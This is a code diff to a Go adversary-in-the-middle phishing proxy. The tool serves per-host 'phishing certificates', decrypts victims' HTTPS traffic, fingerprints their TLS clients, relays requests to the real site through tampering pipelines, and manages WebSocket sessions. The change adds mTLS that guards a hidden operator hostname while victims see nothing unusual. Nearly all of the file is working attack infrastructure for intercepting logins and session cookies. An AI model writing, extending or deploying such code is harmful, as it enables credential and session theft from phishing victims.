@@ -5,6 +5,7 @@ import (
 	"context"
 	"crypto/rand"
 	"crypto/tls"
+	"crypto/x509"
 	"encoding/hex"
 	"errors"
 	"fmt"
@@ -22,43 +23,28 @@ type certSource interface {
 	GetCertificate(hello *tls.ClientHelloInfo) (*tls.Certificate, error)
 }
 
-// AiTMProxy is a reverse-proxy HTTPS server.
+// AITMProxy is a reverse-proxy HTTPS server.
 // It accepts raw TCP connections on port 443, peeks at the TLS ClientHello
 // to capture bytes for JA4 fingerprinting, completes the TLS handshake using
 // the SNI hostname to select the right certificate, then routes all decrypted
 // HTTP traffic through the configured Pipeline.
-type AiTMProxy struct {
-	certSource certSource
-	pipeline   *Pipeline
-	wsHub      *WSHub
-	spoof      *SpoofProxy
-	logger     *slog.Logger
-}
-
-// NewAiTMProxy constructs a AiTMProxy. Call Start() to begin accepting connections.
-func NewAiTMProxy(
-	certSource certSource,
-	pipeline *Pipeline,
-	wsHub *WSHub,
-	spoof *SpoofProxy,
-	logger *slog.Logger,
-) *AiTMProxy {
-	return &AiTMProxy{
-		certSource: certSource,
-		pipeline:   pipeline,
-		wsHub:      wsHub,
-		spoof:      spoof,
-		logger:     logger,
-	}
+type AITMProxy struct {
+	CertSource     certSource
+	Pipeline       *Pipeline
+	WSHub          *WSHub
+	Spoof          *SpoofProxy
+	Logger         *slog.Logger
+	SecretHostname string         // SNI hostname that triggers mTLS; empty disables mTLS
+	ClientCAs      *x509.CertPool // required client CA pool when SecretHostname is set
 }
 
 // Start begins listening on addr (e.g. ":443") and blocks until ctx is cancelled.
-func (p *AiTMProxy) Start(ctx context.Context, addr string) error {
+func (p *AITMProxy) Start(ctx context.Context, addr string) error {
 	listener, err := net.Listen("tcp", addr)
 	if err != nil {
-		return fmt.Errorf("mitm: listen %s: %w", addr, err)
+		return fmt.Errorf("aitm: listen %s: %w", addr, err)
 	}
-	p.logger.Info("mitm proxy started", "addr", addr)
+	p.Logger.Info("aitm proxy started", "addr", addr)
 
 	// Close the listener when ctx is cancelled so Accept unblocks.
 	go func() {
@@ -73,7 +59,7 @@ func (p *AiTMProxy) Start(ctx context.Context, addr string) error {
 			case <-ctx.Done():
 				return nil
 			default:
-				return fmt.Errorf("mitm: accept: %w", err)
+				return fmt.Errorf("aitm: accept: %w", err)
 			}
 		}
 		go p.handleConn(conn)
@@ -87,7 +73,7 @@ func (p *AiTMProxy) Start(ctx context.Context, addr string) error {
 //     ClientHello to select the right phishing certificate.
 //  3. Allocate a ProxyContext for this connection.
 //  4. Serve HTTP/1.1 over the decrypted connection via serveDecrypted().
-func (p *AiTMProxy) handleConn(rawConn net.Conn) {
+func (p *AITMProxy) handleConn(rawConn net.Conn) {
 	defer rawConn.Close()
 
 	// Wrap in PeekedConn to tee the first TLS record before the handshake
@@ -96,12 +82,28 @@ func (p *AiTMProxy) handleConn(rawConn net.Conn) {
 
 	// Complete the TLS handshake. crypto/tls calls GetCertificate with the
 	// SNI hostname from the ClientHello, so we present the right cert per host.
+	// GetConfigForClient applies mTLS only for the secret management hostname,
+	// so phishing victims are never prompted for a client certificate.
 	tlsConfig := &tls.Config{
-		GetCertificate: p.certSource.GetCertificate,
+		GetCertificate: p.CertSource.GetCertificate,
+	}
+	if p.ClientCAs != nil {
+		secretHostname := p.SecretHostname
+		clientCAs := p.ClientCAs
+		tlsConfig.GetConfigForClient = func(hello *tls.ClientHelloInfo) (*tls.Config, error) {
+			if strings.EqualFold(hello.ServerName, secretHostname) {
+				return &tls.Config{
+					GetCertificate: p.CertSource.GetCertificate,
+					ClientAuth:     tls.RequireAndVerifyClientCert,
+					ClientCAs:      clientCAs,
+				}, nil
+			}
+			return nil, nil
+		}
 	}
 	tlsConn := tls.Server(peeked, tlsConfig)
 	if err := tlsConn.Handshake(); err != nil {
-		p.logger.Debug("mitm: TLS handshake failed", "error", err)
+		p.Logger.Debug("aitm: TLS handshake failed", "error", err)
 		return
 	}
 	defer tlsConn.Close()
@@ -118,14 +120,14 @@ func (p *AiTMProxy) handleConn(rawConn net.Conn) {
 // serveDecrypted reads HTTP requests from the decrypted connection, runs the
 // request pipeline, forwards to upstream if not short-circuited, runs the
 // response pipeline, and writes the response back.
-func (p *AiTMProxy) serveDecrypted(pctx *aitm.ProxyContext, conn net.Conn) {
+func (p *AITMProxy) serveDecrypted(pctx *aitm.ProxyContext, conn net.Conn) {
 	connReader := bufio.NewReader(conn)
 
 	for {
 		req, err := http.ReadRequest(connReader)
 		if err != nil {
 			if !errors.Is(err, io.EOF) && !isConnReset(err) {
-				p.logger.Debug("mitm: reading request", "error", err)
+				p.Logger.Debug("aitm: reading request", "error", err)
 			}
 			return
 		}
@@ -136,7 +138,7 @@ func (p *AiTMProxy) serveDecrypted(pctx *aitm.ProxyContext, conn net.Conn) {
 			sessionID := strings.TrimPrefix(req.URL.Path, "/ws/")
 			rec := newHijackableResponseWriter(conn)
 			pctx.ResponseWriter = rec
-			p.wsHub.HandleUpgrade(rec, req, sessionID)
+			p.WSHub.HandleUpgrade(rec, req, sessionID)
 			return
 		}
 
@@ -145,7 +147,7 @@ func (p *AiTMProxy) serveDecrypted(pctx *aitm.ProxyContext, conn net.Conn) {
 		pctx.ResponseWriter = rec
 
 		// Run the request pipeline.
-		if err := p.pipeline.RunRequest(pctx, req); err != nil {
+		if err := p.Pipeline.RunRequest(pctx, req); err != nil {
 			if errors.Is(err, ErrShortCircuit) {
 				rec.flush()
 				if !rec.keepAlive {
@@ -153,7 +155,7 @@ func (p *AiTMProxy) serveDecrypted(pctx *aitm.ProxyContext, conn net.Conn) {
 				}
 				continue
 			}
-			p.logger.Error("mitm: request pipeline", "error", err)
+			p.Logger.Error("aitm: request pipeline", "error", err)
 			rec.writeError(http.StatusBadGateway, "bad gateway")
 			return
 		}
@@ -161,19 +163,19 @@ func (p *AiTMProxy) serveDecrypted(pctx *aitm.ProxyContext, conn net.Conn) {
 		// Forward to upstream.
 		resp, err := p.forwardRequest(req)
 		if err != nil {
-			p.logger.Error("mitm: forwarding request", "error", err)
+			p.Logger.Error("aitm: forwarding request", "error", err)
 			rec.writeError(http.StatusBadGateway, "bad gateway")
 			continue
 		}
 
 		// Run the response pipeline.
-		if err := p.pipeline.RunResponse(pctx, resp); err != nil && !errors.Is(err, ErrShortCircuit) {
-			p.logger.Error("mitm: response pipeline", "error", err)
+		if err := p.Pipeline.RunResponse(pctx, resp); err != nil && !errors.Is(err, ErrShortCircuit) {
+			p.Logger.Error("aitm: response pipeline", "error", err)
 		}
 
 		// Write response back to client.
 		if err := resp.Write(conn); err != nil {
-			p.logger.Debug("mitm: writing response", "error", err)
+			p.Logger.Debug("aitm: writing response", "error", err)
 			return
 		}
 		resp.Body.Close()
@@ -185,7 +187,7 @@ func (p *AiTMProxy) serveDecrypted(pctx *aitm.ProxyContext, conn net.Conn) {
 }
 
 // forwardRequest sends req to the upstream origin and returns the response.
-func (p *AiTMProxy) forwardRequest(req *http.Request) (*http.Response, error) {
+func (p *AITMProxy) forwardRequest(req *http.Request) (*http.Response, error) {
 	transport := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: false},
 		DialContext: (&net.Dialer{
@@ -194,6 +196,7 @@ func (p *AiTMProxy) forwardRequest(req *http.Request) (*http.Response, error) {
 		}).DialContext,
 		ResponseHeaderTimeout: 30 * time.Second,
 	}
+
 	client := &http.Client{
 		Transport: transport,
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
@@ -212,6 +215,7 @@ func (p *AiTMProxy) forwardRequest(req *http.Request) (*http.Response, error) {
 	if err != nil {
 		return nil, fmt.Errorf("upstream request: %w", err)
 	}
+
 	// Tag the response with the original request for sub-filter hostname matching.
 	resp.Request = req
 	return resp, nil
@@ -249,8 +253,14 @@ func newBufferedResponseWriter(conn net.Conn) *bufferedResponseWriter {
 	}
 }
 
-func (w *bufferedResponseWriter) Header() http.Header        { return w.header }
-func (w *bufferedResponseWriter) WriteHeader(code int)       { w.code = code }
+func (w *bufferedResponseWriter) Header() http.Header {
+	return w.header
+}
+
+func (w *bufferedResponseWriter) WriteHeader(code int) {
+	w.code = code
+}
+
 func (w *bufferedResponseWriter) Write(b []byte) (int, error) {
 	w.buf = append(w.buf, b...)
 	return len(b), nil
@@ -283,12 +293,25 @@ type hijackableResponseWriter struct {
 }
 
 func newHijackableResponseWriter(conn net.Conn) *hijackableResponseWriter {
-	return &hijackableResponseWriter{conn: conn, header: make(http.Header), code: http.StatusOK}
+	return &hijackableResponseWriter{
+		conn:   conn,
+		header: make(http.Header),
+		code:   http.StatusOK,
+	}
 }
 
-func (w *hijackableResponseWriter) Header() http.Header        { return w.header }
-func (w *hijackableResponseWriter) WriteHeader(code int)       { w.code = code }
-func (w *hijackableResponseWriter) Write(b []byte) (int, error) { return w.conn.Write(b) }
+func (w *hijackableResponseWriter) Header() http.Header {
+	return w.header
+}
+
+func (w *hijackableResponseWriter) WriteHeader(code int) {
+	w.code = code
+}
+
+func (w *hijackableResponseWriter) Write(b []byte) (int, error) {
+	return w.conn.Write(b)
+}
+
 func (w *hijackableResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
 	brw := bufio.NewReadWriter(bufio.NewReader(w.conn), bufio.NewWriter(w.conn))
 	return w.conn, brw, nil
